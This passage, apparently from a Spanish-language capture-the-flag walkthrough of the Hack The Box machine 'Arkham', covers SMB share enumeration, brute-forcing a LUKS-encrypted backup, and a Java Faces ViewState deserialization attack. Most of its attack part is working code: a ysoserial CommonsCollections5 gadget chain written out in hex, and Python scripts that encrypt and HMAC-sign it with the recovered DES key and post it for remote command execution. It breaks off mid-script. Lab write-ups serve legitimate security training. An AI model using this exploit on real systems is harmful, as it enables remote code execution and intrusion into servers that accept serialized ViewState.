Potentially risky methods: PUT DELETE 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-08-06T16:30:27 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.53 seconds Enumeraci\u00f3n SMB Se enumera los recursos samba con null session: smbclient -L 10.10.10.130 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin BatShare Disk Master Wayne's secrets C$ Disk Default share IPC$ IPC Remote IPC Users Disk CME da mas info: cme smb 10.10.10.130 -u 'guest' -p '' --shares SMB 10.10.10.130 445 ARKHAM [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False) SMB 10.10.10.130 445 ARKHAM [+] ARKHAM\\guest: SMB 10.10.10.130 445 ARKHAM [+] Enumerated shares SMB 10.10.10.130 445 ARKHAM Share Permissions Remark SMB 10.10.10.130 445 ARKHAM ----- ----------- ------ SMB 10.10.10.130 445 ARKHAM ADMIN$ Remote Admin SMB 10.10.10.130 445 ARKHAM BatShare READ Master Wayne's secrets SMB 10.10.10.130 445 ARKHAM C$ Default share SMB 10.10.10.130 445 ARKHAM IPC$ READ Remote IPC SMB 10.10.10.130 445 ARKHAM Users READ Exfiltramos informaci\u00f3n: smbclient \\\\\\\\10.10.10.130\\\\BatShare -N Try \"help\" to get a list of possible commands. smb: \\> dir . D 0 Sun Feb 3 14:00:10 2019 .. D 0 Sun Feb 3 14:00:10 2019 appserver.zip A 4046695 Fri Feb 1 07:13:37 2019 smb: \\> get appserver.zip getting file \\appserver.zip of size 4046695 as appserver.zip (2028,7 KiloBytes/sec) (average 2028,7 KiloBytes/sec) Se revisa el contenido: unzip appserver.zip Archive: appserver.zip inflating: IMPORTANT.txt inflating: backup.img cat IMPORTANT.txt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: IMPORTANT.txt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Se intenta montar el volumen pero est\u00e1 cifrado: cryptsetup open --type luks /home/x/Documentos/htb/arkham/backup/backup.img puto Introduzca la frase contrase\u00f1a de /home/x/Documentos/htb/arkham/backup/backup.img: No hay ninguna clave disponible con esa frase contrase\u00f1a. Cracking luks Usamos la siguiente utilidad: Bruteforce-luks bruteforce-luks -f ./batman.dic backup.img -t 3 -v 1 Tried passwords: 60 Tried passwords per second: 0,759494 Last tried password: batman54 Password found: batmanforever Y se monta el volumen (se encuentra la key que cifra la data serializada): cryptsetup open --type luks /home/x/Documentos/htb/arkham/backup/backup.img puto Introduzca la frase contrase\u00f1a de /home/x/Documentos/htb/arkham/backup/backup.img: **batmanforever** mount /dev/mapper/puto backup Deserilializaci\u00f3n Java Faces Se puede ver un caso de data serializada sin cifrar de ejemplo y la otra cifrada de nuestra maquina objetivo: Magic numbers de objeto serializado (aced 0005) echo -n 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s' | base64 -d | xxd 00000000: aced 0005 7572 0013 5b4c 6a61 7661 2e6c ....ur..[Ljava.l 00000010: 616e 672e 4f62 6a65 6374 3b90 ce58 9f10 ang.Object;..X.. 00000020: 7329 6c02 0000 7870 0000 0002 7074 000c s)l...xp....pt.. 00000030: 2f6c 6f67 696e 2e78 6874 6d6c /login.xhtml echo -n 'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=' | base64 -d | xxd 00000000: c07a 34c2 62ee e5c7 88b4 88be 23b5 e412 .z4.b.......#... 00000010: 2d46 01be 21d7 6599 f3de 2903 e678 387e -F..!.e...)..x8~ 00000020: db72 8da3 5c4c b545 0c53 a8b6 2ea2 498e .r..\\L.E.S....I. 00000030: ef42 ad0e d9e0 8c39 b498 dcc0 f6a1 e361 .B.....9.......a 00000040: eaf1 a348 d6ef 3bb5 99d2 815e dc67 4f54 ...H..;....^.gOT 00000050: 669d 6516 4c9c 82b8 d709 bb11 f.e.L....... Crear payload serializado: java -jar /opt/ysoserial/ysoserial-all.jar CommonsCollections5 'cmd /c ping -n 1 10.10.14.11' > payload.bin Se ha generado correctamente, magig number aced 0005 : cat payload.bin| xxd 00000000: aced 0005 7372 002e 6a61 7661 782e 6d61 ....sr..javax.ma 00000010: 6e61 6765 6d65 6e74 2e42 6164 4174 7472 nagement.BadAttr 00000020: 6962 7574 6556 616c 7565 4578 7045 7863 ibuteValueExpExc Script en python decryptor.py para cifrar nuestros payloads serializados: #!/usr/bin/python3 import requests import pyDes , hmac import signal import time , sys from hashlib import sha1 from base64 import b64encode , b64decode def def_handler ( sig , frame ): print ( \" \\n\\n [+] Saliendo... \\n \" ) sys . exit ( 1 ) # Ctrl+C signal . signal ( signal . SIGINT , def_handler ) # Variables globales url = \"http://10.10.10.130:8080/userSubscribe.faces\" def createpayload (): payload = open ( 'payload.bin' , 'rb' ) . read () return encrypt_data ( payload ) def encrypt_data ( payload ): key = b64decode ( 'SnNGOTg3Ni0=' ) obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) encryted_data = obj . encrypt ( payload ) hash_value = ( hmac . new ( key , bytes ( encryted_data ), sha1 ) . digest ()) encrypted_view_state = encryted_data + hash_value return b64encode ( encrypted_view_state ) def decrypt_view_state ( viewstate ): key = b64decode ( 'SnNGOTg3Ni0=' ) viewstate = b64decode ( viewstate ) #Padding para hacer viewstate multiplo de 8 padding = b ' \\x00\\x00\\x00\\x00 ' viewstate += padding obj = pyDes . des ( key , pyDes . ECB , padmode = pyDes . PAD_PKCS5 ) view_state_decrypted = obj . decrypt ( viewstate ) return view_state_decrypted def exploit (): viewstate = createpayload () data = { 'javax.faces.ViewState' : viewstate } r = requests . post ( url , data = data ) print ( r . text ) if __name__ == '__main__' : #print(decrypt_view_state(\"wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg=\")) exploit () Exploit mejorado Pasamos nuestro payload a hexadecimal para trabajar con python, unicamente introducimos dos variantes la longitud del comando y el comando por un input: for line in $( xxd -p payload.bin | sed 's/../\\\\x&/g' ) ; do echo \"payload += b' $line '\" ; done payload += b '\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2e\\x6a\\x61\\x76\\x61\\x78\\x2e\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x2e\\x42\\x61\\x64\\x41\\x74' payload += b '\\x74\\x72\\x69\\x62\\x75\\x74\\x65\\x56\\x61\\x6c\\x75\\x65\\x45\\x78\\x70\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd4\\xe7\\xda\\xab\\x63\\x2d' payload += b '\\x46\\x40\\x02\\x00\\x01\\x4c\\x00\\x03\\x76\\x61\\x6c\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63' payload += b '\\x74\\x3b\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a' payload += b '\\x3b\\x1c\\xc4\\x02\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5' payload += b '\\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e' payload += b '\\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x74\\x00' payload += b '\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61' #!/usr/bin/python3 import requests import pyDes , hmac import signal import time , sys from hashlib import sha1 from base64 import b64encode , b64decode def def_handler ( sig , frame ): print ( \" \\n\\n [+] Saliendo... \\n \" ) sys . exit ( 1 ) # Ctrl+C signal . signal ( signal . SIGINT , def_handler ) # Variables globales url = \"http://10.10.10.130:8080/userSubscribe.faces\" def createpayload ( cmd ): #payload = open('payload.bin','rb').read() payload = b '' payload += b ' \\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2e\\x6a\\x61\\x76\\x61\\x78\\x2e\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x2e\\x42\\x61\\x64\\x41\\x74 ' payload += b ' \\x74\\x72\\x69\\x62\\x75\\x74\\x65\\x56\\x61\\x6c\\x75\\x65\\x45\\x78\\x70\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd4\\xe7\\xda\\xab\\x63\\x2d ' payload += b ' \\x46\\x40\\x02\\x00\\x01\\x4c\\x00\\x03\\x76\\x61\\x6c\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63 ' payload += b ' \\x74\\x3b\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a ' payload += b ' \\x3b\\x1c\\xc4\\x02\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5 ' payload += b ' \\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e ' payload += b ' \\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x74\\x00 ' payload += b ' \\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61 ' payload += b ' \\x63\\x65\\x74\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65 ' payload += b ' \\x6d\\x65\\x6e\\x74\\x3b\\x4c\\x00\\x14\\x73\\x75\\x70\\x70\\x72\\x65\\x73\\x73\\x65\\x64\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x73\\x74\\x00 ' payload += b ' \\x10\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4c\\x69\\x73\\x74\\x3b\\x78\\x70\\x71\\x00\\x7e\\x00\\x08\\x70\\x75\\x72\\x00\\x1e\\x5b ' payload += b ' \\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x02 ' payload += b ' \\x46\\x2a\\x3c\\x3c\\xfd\\x22\\x39\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x03\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e ' payload += b ' \\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x61\\x09\\xc5\\x9a\\x26\\x36\\xdd\\x85\\x02\\x00\\x08\\x42\\x00 ' payload += b ' \\x06\\x66\\x6f\\x72\\x6d\\x61\\x74\\x49\\x00\\x0a\\x6c\\x69\\x6e\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x4c\\x00\\x0f\\x63\\x6c\\x61\\x73\\x73\\x4c\\x6f ' payload += b ' \\x61\\x64\\x65\\x72\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0e\\x64\\x65\\x63\\x6c\\x61\\x72\\x69\\x6e\\x67\\x43\\x6c\\x61\\x73\\x73 ' payload += b ' \\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x08\\x66\\x69\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64 ' payload += b ' \\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x6d\\x6f\\x64\\x75\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0d ' payload += b ' \\x6d\\x6f\\x64\\x75\\x6c\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x01\\x00\\x00\\x00\\x51\\x74\\x00\\x03\\x61\\x70 ' payload += b ' \\x70\\x74\\x00\\x26\\x79\\x73\\x6f\\x73\\x65\\x72\\x69\\x61\\x6c\\x2e\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\\x73\\x2e\\x43\\x6f\\x6d\\x6d\\x6f\\x6e\\x73 ' payload += b ' \\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x35\\x74\\x00\\x18\\x43\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69 ' payload += b ' \\x6f\\x6e\\x73\\x35\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x09\\x67\\x65\\x74\\x4f\\x62\\x6a\\x65\\x63\\x74\\x70\\x70\\x73\\x71\\x00\\x7e\\x00\\x0b\\x01 ' payload += b ' \\x00\\x00\\x00\\x33\\x71\\x00\\x7e\\x00\\x0d\\x71\\x00\\x7e\\x00\\x0e\\x71\\x00\\x7e\\x00\\x0f\\x71\\x00\\x7e\\x00\\x10\\x70\\x70\\x73\\x71\\x00\\x7e ' payload += b ' \\x00\\x0b\\x01\\x00\\x00\\x00\\x22\\x71\\x00\\x7e\\x00\\x0d\\x74\\x00\\x19\\x79\\x73\\x6f\\x73\\x65\\x72\\x69\\x61\\x6c\\x2e\\x47\\x65\\x6e\\x65\\x72 ' payload += b ' \\x61\\x74\\x65\\x50\\x61\\x79\\x6c\\x6f\\x61\\x64\\x74\\x00\\x14\\x47\\x65\\x6e\\x65\\x72\\x61\\x74\\x65\\x50\\x61\\x79\\x6c\\x6f\\x61\\x64\\x2e\\x6a ' payload += b ' \\x61\\x76\\x61\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x70\\x70\\x73\\x72\\x00\\x1f\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c ' payload += b ' \\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x45\\x6d\\x70\\x74\\x79\\x4c\\x69\\x73\\x74\\x7a\\xb8\\x17\\xb4\\x3c\\xa7\\x9e\\xde\\x02\\x00\\x00\\x78\\x70 ' payload += b ' \\x78\\x73\\x72\\x00\\x34\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63 ' payload += b ' \\x74\\x69\\x6f\\x6e\\x73\\x2e\\x6b\\x65\\x79\\x76\\x61\\x6c\\x75\\x65\\x2e\\x54\\x69\\x65\\x64\\x4d\\x61\\x70\\x45\\x6e\\x74\\x72\\x79\\x8a\\xad\\xd2 ' payload += b ' \\x9b\\x39\\xc1\\x1f\\xdb\\x02\\x00\\x02\\x4c\\x00\\x03\\x6b\\x65\\x79\\x71\\x00\\x7e\\x00\\x01\\x4c\\x00\\x03\\x6d\\x61\\x70\\x74\\x00\\x0f\\x4c\\x6a ' payload += b ' \\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4d\\x61\\x70\\x3b\\x78\\x70\\x74\\x00\\x03\\x66\\x6f\\x6f\\x73\\x72\\x00\\x2a\\x6f\\x72\\x67\\x2e\\x61 ' payload += b ' \\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x6d\\x61\\x70\\x2e ' payload += b ' \\x4c\\x61\\x7a\\x79\\x4d\\x61\\x70\\x6e\\xe5\\x94\\x82\\x9e\\x79\\x10\\x94\\x03\\x00\\x01\\x4c\\x00\\x07\\x66\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00 ' payload += b ' \\x2c\\x4c\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68\\x65\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2f\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f ' payload += b ' \\x6e\\x73\\x2f\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x3b\\x78\\x70\\x73\\x72\\x00\\x3a\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68 ' payload += b ' \\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x66\\x75\\x6e\\x63\\x74\\x6f\\x72\\x73 ' payload += b ' \\x2e\\x43\\x68\\x61\\x69\\x6e\\x65\\x64\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x30\\xc7\\x97\\xec\\x28\\x7a\\x97\\x04\\x02\\x00\\x01 ' payload += b ' \\x5b\\x00\\x0d\\x69\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x73\\x74\\x00\\x2d\\x5b\\x4c\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68 ' payload += b ' \\x65\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2f\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2f\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72 ' payload += b ' \\x6d\\x65\\x72\\x3b\\x78\\x70\\x75\\x72\\x00\\x2d\\x5b\\x4c\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73 ' payload += b ' \\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x3b\\xbd\\x56\\x2a\\xf1\\xd8 ' payload += b ' \\x34\\x18\\x99\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x05\\x73\\x72\\x00\\x3b\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d ' payload += b ' \\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x66\\x75\\x6e\\x63\\x74\\x6f\\x72\\x73\\x2e\\x43\\x6f\\x6e\\x73 ' payload += b ' \\x74\\x61\\x6e\\x74\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x58\\x76\\x90\\x11\\x41\\x02\\xb1\\x94\\x02\\x00\\x01\\x4c\\x00\\x09\\x69 ' payload += b ' \\x43\\x6f\\x6e\\x73\\x74\\x61\\x6e\\x74\\x71\\x00\\x7e\\x00\\x01\\x78\\x70\\x76\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x52 ' payload += b ' \\x75\\x6e\\x74\\x69\\x6d\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x78\\x70\\x73\\x72\\x00\\x3a\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61 ' payload += b ' \\x63\\x68\\x65\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x73\\x2e\\x63\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x2e\\x66\\x75\\x6e\\x63\\x74\\x6f ' payload += b ' \\x72\\x73\\x2e\\x49\\x6e\\x76\\x6f\\x6b\\x65\\x72\\x54\\x72\\x61\\x6e\\x73\\x66\\x6f\\x72\\x6d\\x65\\x72\\x87\\xe8\\xff\\x6b\\x7b\\x7c\\xce\\x38\\x02 ' payload += b ' \\x00\\x03\\x5b\\x00\\x05\\x69\\x41\\x72\\x67\\x73\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63 ' payload += b ' \\x74\\x3b\\x4c\\x00\\x0b\\x69\\x4d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x05\\x5b\\x00\\x0b\\x69\\x50\\x61\\x72\\x61\\x6d ' payload += b ' \\x54\\x79\\x70\\x65\\x73\\x74\\x00\\x12\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x43\\x6c\\x61\\x73\\x73\\x3b\\x78\\x70\\x75\\x72 ' payload += b ' \\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90\\xce\\x58\\x9f\\x10\\x73\\x29\\x6c\\x02 ' payload += b ' \\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x02\\x74\\x00\\x0a\\x67\\x65\\x74\\x52\\x75\\x6e\\x74\\x69\\x6d\\x65\\x75\\x72\\x00\\x12\\x5b\\x4c\\x6a\\x61\\x76 ' payload += b ' \\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x43\\x6c\\x61\\x73\\x73\\x3b\\xab\\x16\\xd7\\xae\\xcb\\xcd\\x5a\\x99\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x00 ' payload += b ' \\x74\\x00\\x09\\x67\\x65\\x74\\x4d\\x65\\x74\\x68\\x6f\\x64\\x75\\x71\\x00\\x7e\\x00\\x2f\\x00\\x00\\x00\\x02\\x76\\x72\\x00\\x10\\x6a\\x61\\x76\\x61 ' payload += b ' \\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\xa0\\xf0\\xa4\\x38\\x7a\\x3b\\xb3\\x42\\x02\\x00\\x00\\x78\\x70\\x76\\x71\\x00\\x7e\\x00 ' payload += b ' \\x2f\\x73\\x71\\x00\\x7e\\x00\\x28\\x75\\x71\\x00\\x7e\\x00\\x2c\\x00\\x00\\x00\\x02\\x70\\x75\\x71\\x00\\x7e\\x00\\x2c\\x00\\x00\\x00\\x00\\x74\\x00 ' payload += b ' \\x06\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x75\\x71\\x00\\x7e\\x00\\x2f\\x00\\x00\\x00\\x02\\x76\\x72\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67 ' payload += b ' \\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x78\\x70\\x76\\x71\\x00\\x7e\\x00\\x2c\\x73\\x71\\x00\\x7e ' payload += b ' \\x00\\x28\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9 ' payload += b ' \\x1d\\x7b\\x47\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00 ' payload += chr ( len ( cmd )) . encode () payload += cmd . encode () payload += b ' 